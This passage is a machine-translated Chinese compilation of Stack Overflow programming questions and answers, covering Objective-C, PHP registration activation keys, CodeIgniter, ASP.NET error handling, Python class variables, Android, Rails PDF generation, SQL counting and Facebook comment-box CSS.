- (id) initWithPhoto:(UIImage)image name:(NSString*)stringA photographer:(NSString*)stringB; 
```

而且你可能也需要重写你的 init 。

```
// PhotoItem.h

@implementation PhotoItem

@synthesize photo, name, photographer;

- (id) initWithPhoto:(UIImage)image name:(NSString*)stringA photographer:(NSString*)stringB
{
    self = [super init];
    if (self) {
         photo = image;
         name = stringA;
         photographer = stringB;
    }
} 
```

然后访问它的任何东西

```
PhotoItem *photo1 = [[PhotoItem alloc] initWithPhoto:[UIImage imageNamed:@"1.jpg"] name:@"roy rest"  photographer:@"roy"];

photo1.photo // returns UIImage
photo1.name // returns NSString
photo1.photographer // returns NSString 
```

因此，如果它们是数组中的对象，它将是

```
[photoArray objectAtIndex:0] // returns your PhotoItem Object
[[photoArray objectAtIndex:0] photo] // returns that PhotoItem Object then gets the photo out of it returning a UIImage in total. 
```

# iphone - SMS窗口不会关闭objective-C

> ID：10862216
> 
> 赞同：4
> 
> 时间：2012-06-02T12:10:56.610
> 
> 标签：iphone, objective-c, ios

您好我正在尝试为 adobe AIR 制作 SMS 原生扩展。我之前没有在objective-c中编码，但一切正常，除了按下发送或取消时SMS窗口不会关闭。以下是代码的主要部分，但如果您需要更多信息，请询问我。谢谢阅读。还有为什么 xcode 在第二行告诉我：“协议中的方法未实现”？

```
#import "SMSComposerHelper.h"
@implementation SMSComposerHelper

//Event name
static  NSString *event_name = @"SMS_COMPOSER_EVENT";

-(void) sendSMS:(NSString *)toRecipient
         messageBody:(NSString *)messageBody
{

    FREDispatchStatusEventAsync(context, (uint8_t*)[event_name UTF8String], (uint8_t*)[@"WILL_SHOW_MAIL_COMPOSER" UTF8String]);

           MFMessageComposeViewController *smsComposer = [[MFMessageComposeViewController alloc] init];
          smsComposer.messageComposeDelegate = self;

    //make string into array
    NSArray *recipientArray;
    recipientArray = [NSArray arrayWithObjects: toRecipient, nil];

    smsComposer.body = messageBody;   
    smsComposer.recipients = recipientArray;

    //show sms composer
    [[[[UIApplication sharedApplication] keyWindow] rootViewController] presentModalViewController:smsComposer animated:YES];

}

// Dismisses the sms composition interface when users tap Cancel or Send.
-(void) smsComposeController: (MFMessageComposeViewController*)controller didFinishWithResult: (MessageComposeResult)result error:(NSError*)error
{
    NSString *event_info = @"";
          // Notifies users about errors associated with the interface
          switch (result)
          {
                    case MessageComposeResultCancelled:
            event_info = @"SMS_CANCELED";
                              break;
        case MessageComposeResultSent:
            event_info = @"SMS_SENT";
                              break;
                    case MessageComposeResultFailed:
            event_info = @"SMS_FAILED";
                              break;
                    default:
            event_info = @"SMS_UNKNOWN";
            break;
          }

    FREDispatchStatusEventAsync(context, (uint8_t*)[event_name UTF8String], (uint8_t*)[event_info UTF8String]);
    FREDispatchStatusEventAsync(context, (uint8_t*)[event_name UTF8String], (uint8_t*)[@"WILL_HIDE_SMS_COMPOSER" UTF8String]);

    context = nil;

    //hide mail composer
   [[[[UIApplication sharedApplication] keyWindow] rootViewController] dismissModalViewControllerAnimated:YES];
}

-(void)setContext:(FREContext)ctx {
    context = ctx;
}

@end 
```

回复 ：

奥马尔非常感谢您的回答和如此迅速的回答！首先，我尝试了您的使用解决方案

```
[controller dismissModalViewControllerAnimated:YES]; 
```

但这什么也没做，所以我把它改回来了。我的标题已经是：

```
@interface SMSComposerHelper : NSObject<MFMessageComposeViewControllerDelegate> { 
```

所以我决定专注于修复警告。通过更改解决了警告：

```
-(void) smsComposeController: (MFMessageComposeViewController*)controller didFinishWithResult: (MessageComposeResult)result error:(NSError*)error 
```

到：

```
- (void)messageComposeViewController:(MFMessageComposeViewController *)controller didFinishWithResult:(MessageComposeResult)result 
```

我很想知道为什么会这样？你认识奥马尔吗？所以我解决了警告，但它仍然没有解除。所以我再次尝试了你的建议：

```
[controller dismissModalViewControllerAnimated:YES]; 
```

它起作用了！！！！非常感谢这个人。你不知道我被困了多少个小时。我很乐意接受您的回答。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T12:16:36.513

代替

```
 [[[[UIApplication sharedApplication] keyWindow] rootViewController] dismissModalViewControllerAnimated:YES]; 
```

写

```
 [controller dismissModalViewControllerAnimated:YES]; 
```

也用于警告

转到`SMSComposerHelper.h` 并添加以下内容

```
@interface SMSComposerHelper : UIViewController<MFMessageComposeViewControllerDelegate>{ 
```

代替

```
@interface SMSComposerHelper : UIViewController{ 
```

# php - php，通过电子邮件激活注册。如何最小化数据库搜索成本

> ID：10862226
> 
> 赞同：0
> 
> 时间：2012-06-02T12:12:17.570
> 
> 标签：php, email, registration

这个过程非常简单。

用户填写注册字段后，mysql数据库表中的一列即'activation_key'保持随机生成的长字符串，另一列即`activated`保持值为0。

激活电子邮件将发送到注册人的电子邮件，其中包含该列的随机键值的激活链接`activation_key`。单击该链接后，该 url 会在数据库中搜索包含长字符串的`activation_key'`列。如果有任何此类值，则“activation_key”设置为空白，“激活”列设置为 1。``.``

 ``当生成激活密钥字符串时，会进行搜索以查看正在生成的密钥是否已经存在，如果存在，则生成另一个随机值以获得唯一的。

因此，当一些潜在成员的注册待定时，实际上会在表中的行上执行类似的字符串搜索。

**至此，一切正常。**

但是想想一个新成员获得了一个激活字符串，该字符串之前是为另一个完成注册的成员生成的。

万一已经注册的会员点击了旧邮箱中的激活链接，那么其他新会员即使实际上没有完成注册，也会完成注册。

所以我决定不将“activation_key”表设置为空白，因此对所有已经或可能成为成员的成员进行了类似的字符串搜索。

那也行。但是如果用户数量很大，即超过 1 lac，那么发送激活电子邮件的注册过程将花费很多时间。

1）任何其他方式来最小化数据库探索成本？

2) 在这种情况下，像 facebook 这样的大型网站采取什么政策？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:27:43.917

两次生成相同的激活密钥的机会应该很小。但解决方案是在电子邮件中发送激活密钥**和用户名，并对照两者检查数据库。**

因此，当激活电子邮件发出时，它包含一个链接

```
/activate.php?activation_key=key&username=name 
```

而不仅仅是`activation_key`. 在检查密钥是否真实时，您可以

```
WHERE activation_key = key AND username = name; 
```

在 mysql 查询中。

因此，通过这种方式，您可以保护系统，以便正确激活用户需要用户名和密钥。

为确保更安全，您可以对列进行`UNIQUE`索引。`activation_key`当脚本尝试使用已经存在的键将生成的键添加到用户的行时，查询执行将失败，因为该列被设置为唯一。然后您只需要修改脚本以尝试生成密钥，直到它成功存储在数据库中。**确保不要让它无限循环。**

## 无限循环保护

```
$count = 0;
while ( $errno === 0 )
{
    // mySQL query here
    $errno = mysql_errno();

    $count++;

    if ( $count >= 5 )
            $errno = -1;
}

if ( $errno === -1 )
    echo "Sorry, the script was unable to generate the token for your activation."; 
```

此循环将运行您放置在那里的查询（将激活令牌添加到数据库），直到查询执行没有错误。随着每次执行`$count`的增加，如果达到限制（示例中为 5），它将强制循环结束（设置`$errno`为非零但不是真正的 mySQL 错误值），然后向用户显示错误消息.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:31:30.473

在激活链接中包括用户 ID，可能还包括电子邮件地址或用户名。可能的优势：

*   您可以对用户 ID 进行整数搜索
*   您无需担心重复的激活链接
*   您不需要索引activation_key 字段，因为无论如何您都不会搜索它
*   包含电子邮件（或用户名）时，没有人能够“尝试”所有用户 ID 以激活那些具有 activation_key 副本的用户
*   暴力破解activation_keys来激活所有用户将非常困难或不可能。
*   您不必担心activation_key 上的数据竞争。

重要提示：不要只使用电子邮件地址和简短的activation_key。确保几乎不可能暴力破解某个电子邮件地址的激活密钥。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T12:19:29.813

将新注册和未激活帐户的数据存储在单独的表中。

由于您可能不需要更多关于非活动用户的基本信息，因此您可以保留不必要的数据，例如配置文件设置。

发送激活密钥后，请检查此表以获取具有相应密钥的条目。如果找到，则将日期转移到真实用户表，并从表中删除等待激活的用户的条目。

通过这种方式，您可以：a) 节省空间，因为激活的用户不再需要密钥 b) 更快地了解尚未激活的用户。

在我看来，您还应该将它与删除 3 天左右未激活的用户的 cron 结合起来；-)``

# mysql - Codeigniter SQL 查询 - DATE_ADD

> ID：10862232
> 
> 赞同：0
> 
> 时间：2012-06-02T12:13:06.820
> 
> 标签：mysql, codeigniter

我正在使用 CodeIgniter (http://codeigniter.com/) 并且有一个查询问题：

```
select *
from mb_login_attempts
where ip_adress_hash = ?
and DATE_ADD(attempt_date,INTERVAL 30 MINUTE) > NOW() 
```

我想使用以下语法：

```
$this->db->where('ip_adress_hash', $this->encrypt->sha1($this->input->ip_address()));
$this->db->where('DATE_ADD(attempt_date,INTERVAL 30 MINUTE) >','NOW()',TRUE);

if($this->db->count_all_results('mb_login_attempts') >= 3) {

 return true;    

} 
```

如果我使用此代码：

```
$sql = "select *
from mb_login_attempts
where ip_adress_hash = ?
and DATE_ADD(attempt_date,INTERVAL 30 MINUTE) > NOW()";

$val = $this->db->query($sql,$this->encrypt->sha1($this->input->ip_address()));

if($val->num_rows() >= 3) {

 return true;    

} 
```

有谁知道我如何让第一个代码正常工作？编辑：我已经将一些代码更改为评论 - 但它仍然无法正常工作......

问候 ...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:14:27.883

用值修改最后一行，使其不会转义函数：~~`TRUE`~~ `FALSE``NOW()`

```
$this->db->where('DATE_ADD(attempt_date,INTERVAL 30 MINUTE) >','NOW()', FALSE); 
```

编辑：运行此查询：

```
$this->db->where('ip_adress_hash', $this->encrypt->sha1($this->input->ip_address()));
$this->db->where('DATE_ADD(attempt_date,INTERVAL 30 MINUTE) >','NOW()', FALSE);
$val = $this->db->get('mb_login_attempts'); 
```

EDIT2：仍然可以使用这种形式：

...

```
$this->db->where('ip_adress_hash', $this->encrypt->sha1($this->input->ip_address()));
$this->db->where('DATE_ADD(attempt_date,INTERVAL 30 MINUTE) >','NOW()', FALSE);

if($this->db->count_all_results('mb_login_attempts') >= 3) {

 return true;    

} 
```

# c# - 如何让您的应用显示正确的 HTTP 错误代码

> ID：10862237
> 
> 赞同：1
> 
> 时间：2012-06-02T12:13:41.347
> 
> 标签：c#, asp.net, asp.net-mvc, asp.net-mvc-3

我正在使用`ASP.NET MVC3`和运行网站`Windows Server 2003`。我试图弄清楚如何处理所有 HTTP 错误。我已经实现了代码，但是当返回 404 错误时，有时会在浏览器中显示 403 错误。

这是我实现的代码：

在我的`global.asax.cs`：

```
protected void Application_Error(object sender, EventArgs e)
{
     MvcApplication app = (MvcApplication)sender;
     HttpContext context = app.Context;
     Exception exception = app.Server.GetLastError();
     context.Response.Clear();
     context.ClearError();
     HttpException httpException = exception as HttpException;

     RouteData routeData = new RouteData();
     routeData.Values["controller"] = "Error";
     routeData.Values["action"] = "Index";
     routeData.Values["httpException"] = httpException;

     Server.ClearError();

     IController errorController = new ErrorController();
     errorController.Execute(new RequestContext(new HttpContextWrapper(Context), routeData));
} 
```

`ErrorController.cs`文件：

```
public class ErrorController : Controller
{
     public ActionResult Index()
     {
          ErrorModel model = new ErrorModel();

          HttpException httpException = RouteData.Values["httpException"] as HttpException;
          int httpCode = (httpException == null) ? 500 : httpException.GetHttpCode();

          switch (httpCode)
          {
               case 403:
                    //Response.StatusCode = 403;
                    model.Heading = "Forbidden";
                    model.Message = "You aren't authorised to access this page.";
                    break;
               case 404:
                    //Response.StatusCode = 404;
                    model.Heading = "Page not found";
                    model.Message = "We couldn't find the page you requested.";
                    break;
               case 500:
               default:
                    Response.StatusCode = 500;
                    model.Heading = "Error";
                    model.Message = "Sorry, something went wrong.  It's been logged.";
                    break;
          }

          Response.TrySkipIisCustomErrors = true;

          return View(model);
     }
} 
```

我的 web.config 中没有设置任何内容。

我希望它在用户尝试访问我的目录（例如`app_code`和类似目录）时显示正确的错误。这可能吗？

当我输入`http://localhost:43596/app_code`然后我看到它似乎是一个 404 错误，但它显示 IE 的默认 403 错误页面。如何让我的代码显示正确的 HTTP 错误消息？

我想要这种方式的原因是因为如果用户试图以任何方式破坏网站，我需要记录所有尝试。我希望能够看到谁在做错误的访问。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:22:21.737

> 当我输入`http://localhost:43596/app_code`然后我看到它似乎是一个 404 错误，但它显示 IE 的默认 403 错误页面。

403有什么问题？

> 在万维网上使用的 HTTP 中，403 Forbidden 是当用户请求服务器不允许他们访问的网页或媒体时，Web 服务器返回的 HTTP 状态代码。换句话说，服务器可以访问，但服务器拒绝允许访问该页面。**当目录列表被拒绝时，Microsoft IIS 以相同的方式响应。**

[维基百科](http://en.wikipedia.org/wiki/HTTP_403)

当用户尝试访问该`App_Data`文件夹时，如果您返回 404，则意味着该文件夹在服务器中不存在，但事实是该文件夹可能存在也可能不存在，因为它是 ASP.NET 不存在的特殊文件夹不允许任何人访问它并且它是被禁止的，所以我认为在这种情况下返回 403 是完全有效的。

[缺少目录索引时的 404 与 403](https://stackoverflow.com/questions/5075300/404-vs-403-when-directory-index-is-missing)

[http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html](http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:19:38.937

尝试查看 web.config 部分“customErrors”设置“mode=Off”

```
<configuration>
 <system.web>
  <customErrors defaultRedirect="GenericError.htm" mode="RemoteOnly">
  <error statusCode="500" redirect="InternalError.htm"/>
</customErrors> 
```

# php - 如何将 html_entites 存储在 mysql 中作为它们的表示而不是它们的值

> ID：10862238
> 
> 赞同：1
> 
> 时间：2012-06-02T12:13:47.077
> 
> 标签：php, mysql, encoding

我想存储以下内容：

```
$str= "&#8226; This is a bullet point"; 
```

在我的数据库中作为一个实际的要点而不是它的 html_entity 值。

我试过了：

```
$new_str = html_entity_decode($str); 
```

在我将它存储在数据库中之前，这似乎只适用于某些 html_entities，例如，它适用于 # 或 & 但不适用于

有什么想法我该怎么做？..关于J

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:22:26.360

```
$new_str = mb_convert_encoding($str, 'UTF-8', 'HTML-ENTITIES'); 
```

# python - 理解实例和类变量python

> ID：10862239
> 
> 赞同：5
> 
> 时间：2012-06-02T12:13:48.327
> 
> 标签：python

假设我在不同的场景中有 2 个类。

**方案 1**

```
class MyClass():
    temp = 5 
```

**方案 2**

```
class MyClass():
    temp = 5

    def myfunc(self):
          print self.temp 
```

现在何时将变量`temp`视为类变量和实例变量。我很困惑，因为在这两种情况下我都可以`temp`使用两者来访问变量的值。

1.  `Object.Temp`（表现为实例变量）

2.  `ClassName.Temp`（表现为类变量）

我相信以前也有人问过类似的问题，但如果有人能在我的问题的背景下解释这一点，那将是一个很大的帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T12:22:26.193

类变量在类的所有实例之间共享。对于不可变类型（如 int、str、...），您不会注意到太大的区别。但是考虑一下：

```
class MyClass():
    temp = []  
    def myfunc(self, val):
          self.temp.append(val)
          print self.temp

instance1 = MyClass()
instance1.myfunc(1)    # [1]
instance2 = MyClass()
instance2.myfunc(2)    # [1, 2] 
```

在这种情况下，两个实例共享*同一个*列表，即如果实例本身没有`temp`成员，则使用类的成员。

因此，如果您进一步这样做：

```
MyClass.temp.append(3)
print instance1.temp   # [1, 2, 3]
instance1.temp = []
print instance1.temp   # []         uses the instances temp
print instance2.temp   # [1, 2, 3]
del instance1.temp
print instance1.temp   # [1, 2, 3]  uses the class' temp again 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-02T12:21:52.570

基本上，`MyClass.temp`总是一个类变量。Getting`obj.temp`返回类变量，直到您尝试 set `obj.temp`，这会创建一个屏蔽类变量的成员变量。我希望这有帮助：

```
>>> class MyClass(object):
...     temp = 5
... 
>>> a = MyClass()
>>> b = MyClass()
>>> a.temp
5
>>> b.temp
5
>>> b.temp = 6
>>> a.temp
5
>>> MyClass.temp = 7
>>> a.temp
7
>>> b.temp
6
>>> a.__dict__
{}
>>> b.__dict__
{'temp': 6}
>>> MyClass.__dict__
{..., 'temp': 7} 
```

编辑：正如[mata 所说](https://stackoverflow.com/a/10862293/382471)，调用方法（例如`append()`）`obj.temp`不算作“设置”它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-02T12:25:15.607

`temp`是一个类变量。当您访问该变量时，它会通过继承层进行搜索，因此由于在实例本身中找不到它，它会检查类（下一层）并在那里找到它。

# android - 将 google map.jar 安装到 Moto 手机

> ID：10862242
> 
> 赞同：0
> 
> 时间：2012-06-02T12:14:06.623
> 
> 标签：android, root-access

我尝试在 Moto XT681 手机上使用 com.google.android.maps 库安装应用程序。Eclipse 失败，报告：

```
 Installation error: INSTALL_FAILED_MISSING_SHARED_LIBRARY 
```

通过检查Logcat，它声明如下

```
Package com.xxxx.xxxx requires unavailable shared library com.google.android.maps; failing! 
```

我尝试使用 ddms 将 maps.jar 文件推送到手机中。但是，它说：转移错误：权限被拒绝。我想这是因为 ddms 没有以 root 身份连接手机。我也尝试使用 adb 命令，但是，有些奇怪，当我尝试命令 adb devices 时，它总是重新启动 adb 服务器，并且无法在列表中获取设备？

所以任何人都可以提出出路吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:24:53.163

> 安装错误：INSTALL_FAILED_MISSING_SHARED_LIBRARY

您在该设备上安装的 ROM（无论是来自制造商还是您安装的 ROM 模组）都缺少适用于 Android 的 Google 地图插件。

> 我尝试使用 ddms 将 maps.jar 文件推送到手机中。但是，它说：转移错误：权限被拒绝。我想这是因为 ddms 没有以 root 身份连接手机。我也尝试使用 adb 命令，但是，有些奇怪，当我尝试命令 adb devices 时，它总是重新启动 adb 服务器，并且无法在列表中获取设备？

适用于 Android 的 Google 地图插件随附固件（又名设备 ROM）。如果您的设备缺少此附加组件，请购买具有该附加组件的设备。

# ruby-on-rails - 如何使用 wicked_pdf 将 pdf 文件保存在公用文件夹中

> ID：10862243
> 
> 赞同：5
> 
> 时间：2012-06-02T12:14:12.333
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1, pdf-generation, wicked-pdf

现在我正在使用 Rails 3.0.0。我已经安装了 gem wicked_pdf。现在想将 pdf 文件保存在公共文件夹中。请帮助我。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-04T09:41:09.767

If you need to just create a pdf and not display it:

```
# create a pdf from a string
pdf = WickedPdf.new.pdf_from_string('<h1>Hello There!</h1>')

# create a pdf from string using templates, layouts and content option for header or footer
WickedPdf.new.pdf_from_string(
    render_to_string(:pdf => "pdf_file.pdf", :template => 'templates/pdf.html.erb', :layout => 'pdfs/layout_pdf'), 
    :footer => {:content => render_to_string({:template => 'templates/pdf_footer.html.erb', :layout => 'pdfs/layout_pdf'})}

# or from your controller, using views & templates and all wicked_pdf options as normal
pdf = render_to_string :pdf => "some_file_name"

# then save to a file
save_path = Rails.root.join('pdfs','filename.pdf')
File.open(save_path, 'wb') do |file|
  file << pdf
end 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-09-15T17:47:27.900

这是关于**如何在 ruby​​ on rails 中转换 pdf 中的字符串的**
最佳答案 如果您不反对，我提出了一个答案：
某些服务将 pdf 作为字符串返回，例如：`JVBERi0xLjQKJeLjz9MKNCAwIG9iago8PC9Ue. . .`
您可以从 sting 创建一个 pdf 文件，其中：

```
f = File.new("/tmp/file.pdf", "w")
f.write(Base64.decode64(invoice[:file]).force_encoding('UTF-8'))
f.close 
```

`AcrobatReader`然后您可以使用或其他 pdf 阅读器打开 pdf 文件。
希望它有所帮助。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-06-05T23:21:51.793

此外，您可以这样做：

```
render :pdf          => 'foo',
       :save_to_file => Rails.root.join('public', "foo.pdf"),
       :save_only    => true 
```

# sql - COUNT 和 WHERE 语句查询

> ID：10862247
> 
> 赞同：1
> 
> 时间：2012-06-02T12:14:27.573
> 
> 标签：sql, sql-server-2008

目前我有这个

```
SELECT
    COUNT (enrollment_id) AS enrollments,
    COUNT (result) AS 
    MAX (result) AS highest_result,
    AVG (result) AS average_result,
    MIN (period_code) AS earliest_enrollment    
FROM 
    enrollment
WHERE
result IS NULL 
```

我想要的是总的注册人数，这`COUNT(enrollment_id)`是为了什么。然后我想计算`NULL`结果列中的值的数量以获得`unfinalised_enrollments`.

`WHERE`底部的子句会影响`SELECT`使用结果列的其他语句吗？如果是这样，我该怎么做才能只`NULL`计算结果列中值的数量并将其显示在名为`unfinalised_enrollment`.

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:18:59.790

您可以使用`SUM`代替`COUNT`：

```
SELECT
    COUNT (enrollment_id) AS enrollments,
    SUM (CASE WHEN result IS NULL THEN 1 ELSE 0 END) AS null_results,
    MAX (result) AS highest_result,
    AVG (result) AS average_result,
    MIN (period_code) AS earliest_enrollment    
FROM enrollment 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:29:32.370

这应该完成您正在寻找的东西：

```
SELECT
    COUNT (enrollment_id) AS enrollments,
    ( SELECT COUNT (result) FROM enrollment WHERE result IS NULL ) AS unfinalised_enrollment,
    MAX (result) AS highest_result,
    AVG (result) AS average_result,
    MIN (period_code) AS earliest_enrollment    
FROM 
    enrollment; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T12:37:02.993

你可以使用：

```
SELECT
    COUNT (enrollment_id) AS enrollments,
    Count(*) - Count(result) AS null_results,
    MAX (result) AS highest_result,
    AVG (result) AS average_result,
    MIN (period_code) AS earliest_enrollment    
FROM enrollment 
```

`Count(*)`将计算总行数，Count(result)`enter code here`将计算结果不为空的总行数

# java - 使用 JAXB 和 EclipseLink 创建登录系统

> ID：10862249
> 
> 赞同：-1
> 
> 时间：2012-06-02T12:14:42.773
> 
> 标签：java, xml, jaxb

我想创建一个 XML 模式，其中包含

```
<root>
<login>
    <username> </username>
    <paswword> </paswword>
</login>
</root> 
```

无论有没有 JAXB，我如何读取这些值并将它们用于身份验证。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-03T10:01:52.763

这是文档的 XML 模式：

```
<?xml version="1.0" encoding="UTF-8"?>
<xs:schema attributeFormDefault="unqualified" elementFormDefault="qualified"
           xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:element name="paswword" type="xs:string"/>
    <xs:element name="username" type="xs:string"/>
    <xs:element name="root">
        <xs:complexType>
            <xs:sequence>
                <xs:element ref="login"/>
            </xs:sequence>
        </xs:complexType>
    </xs:element>
    <xs:element name="login">
        <xs:complexType>
            <xs:sequence>
                <xs:element ref="username"/>
                <xs:element ref="paswword"/>
            </xs:sequence>
        </xs:complexType>
    </xs:element>
</xs:schema> 
```

将该模式提供给您用于生成 JAXB 对象的某个脚本之王，将它们打包到一个 jar 中，将其放入您的类路径并用于您的任何目的。

# android - 尝试在 android 中读取 xls 时出现 FileNotFoundException

> ID：10862255
> 
> 赞同：0
> 
> 时间：2012-06-02T12:15:34.897
> 
> 标签：android, excel

我正在尝试在android中读取excel内容，但总是找不到文件异常项目位于：

```
C:\AndroidWorkSpace\AntenaProject 
```

代码是：

```
public void TestClick(View view)
{
    File inputWorkbook = new File("shidur.xls");
    Workbook w;
    StringBuilder sb = new StringBuilder("starting");
    try {

        w = Workbook.getWorkbook(inputWorkbook);
        // Get the first sheet
        Sheet sheet = w.getSheet(0);
        // Loop over first 10 column and lines

        for (int j = 0; j < sheet.getColumns(); j++) {
            for (int i = 0; i < sheet.getRows(); i++) {
                Cell cell = sheet.getCell(j, i);
                //CellType type = cell.getType();

                sb.append(cell.getContents());

            }
        }
    } catch (Exception e) {
        e.printStackTrace();
    }

    TextView tv = (TextView)findViewById(R.id.testText);
    tv.setText(sb.toString());

} 
```

我试图将 shidur.xls 放在以下文件夹中：

```
C:\AndroidWorkSpace\AntenaProject\res\raw
C:\AndroidWorkSpace\AntenaProject\res 
```

但仍然得到这个例外。我正在使用来自[http://jexcelapi.sourceforge.net/](http://jexcelapi.sourceforge.net/)的 jxl.jar， 感谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T12:23:49.093

您提供给 File 构造函数的路径需要是文件的绝对路径，或者您需要使用将另一个 File 对象作为代表文件所在目录的第一个参数的重载。

话虽如此，以这种方式构建文件适用于本地存储（即手机的主存储器）或外部存储（即SD卡）中的文件。

要从 res/raw 目录打开文件，请通过以下方式获取 InputStream

```
 InputStream in = getResources().openRawResource(R.raw.file_name); 
```

然后，您将需要读取输入流内容的代码。我使用看起来像这样的静态辅助方法，但如果文件很大，这*可能会给您带来问题。*还没有发生在我身上，但原则上，将文件的全部内容加载到内存中总是存在风险

```
public static String readStream(InputStream in)
{
    BufferedReader reader = new BufferedReader(new InputStreamReader(in));
    StringBuilder sb = new StringBuilder();
    String line = null;
    try
    {
        while((line = reader.readLine()) != null)
        {
            sb.append(line + "\n");
        }
    }
    catch(Exception ex) { }
    finally
    {
        // NOTE: you don't have my IOUtils class, 
        // but all these methods do is check for null and catch the exceptions that Closeable.close() can throw
        IOUtils.safeClose(in);
        IOUtils.safeClose(reader);
    }
    return sb.toString();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:24:15.210

您应该使用以下代码在 /res/raw 中打开文件

```
getResources().openRawResource(R.raw.shidur.xls) 
```

# javascript - 如何使 facebook 评论框宽度 100%？

> ID：10862256
> 
> 赞同：8
> 
> 时间：2012-06-02T12:15:41.837
> 
> 标签：javascript, html, css, facebook

我正在使用此代码在我的页面上放置一个 facebook 评论框，

```
<script type="text/javascript">
 (function(d, s, id) 
 {
 var js, fjs = d.getElementsByTagName(s)[0];
 if (d.getElementById(id)) return;
 js = d.createElement(s); js.id = id;
 js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=397337283630353";
 fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));
 </script>

<div class="fb-comments" data-href="https://apps.facebook.com/driftee/" data-num-posts="5" data-width="470" data-colorscheme="dark" style="width: 100% !important;"></div> 
```

但我不能让评论框填满页面的 100%。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-06-02T14:13:22.180

您可以通过在 HTML 页面的样式表中添加 CSS 类来做到这一点：

```
.fb-comments, .fb-comments span, .fb-comments iframe { width: 100% !important; } 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-07-24T20:08:53.040

zeeshan 你的解决方案似乎已经过时了，看起来 facebook 更新了他们的插件并且打破了风格。

到目前为止，这可能对我来说效果更好，我相信当 facebook 更新其插件的工作方式时，这种风格将再次被打破。

```
.fb_iframe_widget,
.fb_iframe_widget span,
.fb_iframe_widget iframe[style]  {width: 100% !important;} 
```

我鼓励其他贡献者在时机成熟时为这个问题添加更新的解决方案。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-03T05:38:03.447

好吧，我想我设法解决了它，我分析了评论框，发现 fb-comments div 默认包含一个宽度为 470px 的跨度，在这个跨度内我发现了一个相同宽度的 iframe，所以解决方案是使用 jquery 更改窗口调整大小时的跨度和 iframe 宽度，如下所示：

```
$(window).resize(function(){$('.fb-comments iframe,.fb-comments span:first-child').css({'width':$('#commentboxcontainer').width()});}); 
```

所以现在在窗口调整大小时，整个评论框正在占用容器宽度（通过其他方式它是 100% 宽度）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-04-04T18:05:55.540

我尝试了其他解决方案，但没有一个对我有用。

阅读 fb 文档后，我发现已经支持将属性 data-width="100%" 添加到标签中：

`<div class="fb-comments" data-width="100%" data-href="http://www.mintybolivia.com/" data-numposts="10" data-colorscheme="light"></div>`

它现在正在运行，并且根据它的移动设备文档，此设置是自动设置的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-02T15:26:29.093

尝试添加参数`data-width="{pixels}"`，因为当您获得在此页面上创建的代码时，[https://developers.facebook.com/docs/reference/plugins/comments/](https://developers.facebook.com/docs/reference/plugins/comments/) - 也就是说，如果您知道页面的宽度以像素为单位。我不知道它是否也适用于百分比，但不知何故怀疑它。

那么你的最后一个选择可能是添加相应的。页面加载后动态修改该参数，您可以读出以像素为单位的实际宽度，然后仅解析 XFBML（在加载脚本时将 xfbml 参数设置为 false，并在设置数据宽度后调用[FB.XFBML.parse](https://developers.facebook.com/docs/reference/javascript/FB.XFBML.parse/)范围）。当然，如果稍后用户调整浏览器窗口的大小或其他方式修改了宽度获取，那仍然无济于事......</p>

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-01-21T11:05:17.640

```
.fb_iframe_widget,
.fb_iframe_widget > span,
.fb_iframe_widget iframe {
    width: 100% !important;
} 
```

这对我有用

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-03-31T07:27:14.283

使用 jQuery，您可以在加载 Facebook 评论框之前覆盖硬编码的宽度。

```
$('document').ready(function(){
    $('.fb-comments').attr('data-width',$('body').width());
}); 
```

**ps您可以将“body”替换为您希望评论框匹配的任何其他元素。**

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2019-04-27T21:44:25.087

```
setTimeout(function run() {
    if ($('.fb-comments span:first-child, .fb-comments span iframe').length == 0)
        setTimeout(run, 1000);
    else
        $('.fb-comments span:first-child, .fb-comments span iframe')[1].style.width = "100%";
}, 1000); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-06-23T12:52:43.487

**这在您的代码**上相当简单****

 ****添加**以下代码**data-width="100%"**

```
<div class="fb-comments" data-href="{{ post.build_absolute_uri }}"data-width="100%" data-numposts="5"></div>
```**

# c# - ViewStateUserKey + 共享主机 + ViewStateMac 验证失败

> ID：10862258
> 
> 赞同：2
> 
> 时间：2012-06-02T12:16:15.107
> 
> 标签：c#, asp.net, security, viewstate, shared-hosting

所以，这个问题很简单，尽管我开始怀疑这是否会得到回答......

